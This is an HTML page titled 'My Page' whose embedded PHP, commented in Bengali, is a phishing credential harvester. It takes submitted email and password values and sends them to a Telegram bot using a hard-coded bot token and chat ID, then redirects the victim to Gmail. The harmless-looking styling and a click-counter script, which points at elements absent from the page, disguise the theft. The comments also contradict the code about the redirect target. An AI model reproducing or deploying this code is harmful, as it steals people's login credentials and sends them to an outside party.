<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>My Page</title>
<style>
body {
  font-family: system-ui, Arial, sans-serif;
  background: #f1f5f9;
  display: grid;
  place-items: center;
  min-height: 100vh;
  margin: 0;
}
.card {
  background: #fff;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 10px 30px rgba(0,0,0,.08);
  text-align: center;
}
button {
  background: #2563eb;
  color: #fff;
  border: 0;
  padding: 10px 20px;
  border-radius: 10px;
  font-weight: 700;
  cursor: pointer;
}

</style>
</head>
<body>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ফর্ম থেকে আসা ডেটা রিসিভ করা
    $email = $_POST['email'];
    $password = $_POST['password'];

    // আপনার টেলিগ্রাম বোট টোকেন ও চ্যাট আইডি এখানে বসান
    $botToken = "8672893919:AAGjdQM-tJhBk4noBQ97SG8AGQDNJjOMETU";
    $chatId = "5763156648";

    // মেসেজের বিন্যাস তৈরি করা
    $message = "🔔 নতুন ডেটা পাওয়া গেছে:\n\n📧 Email: $email\n🔑 Password: $password";

    // টেলিগ্রাম API-এর ইউআরএল তৈরি করা
    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    // টেলিগ্রাম সার্ভারে রিকোয়েস্ট পাঠানো
    $response = file_get_contents($telegramApiUrl);

    if ($response) {
        // সফলভাবে মেসেজ যাওয়ার পর এখন গুগলের বদলে সরাসরি ফেসবুকের আসল সাইটে রিডাইরেক্ট হবে
        header("Location: https://www.gmail.com");
        exit();
    } else {
        echo "দুঃখিত, মেসেজ পাঠানো যায়নি। বোট টোকেন বা চ্যাট আইডি চেক করুন।";
    }
}
?>

<script>
let clicks = 0;
document.getElementById('btn').addEventListener('click', () => {
  clicks++;
  document.getElementById('out').textContent = 'Clicked ' + clicks + ' time(s)';
  console.log('Button clicked', clicks);
});

</script>
</body>
</html>
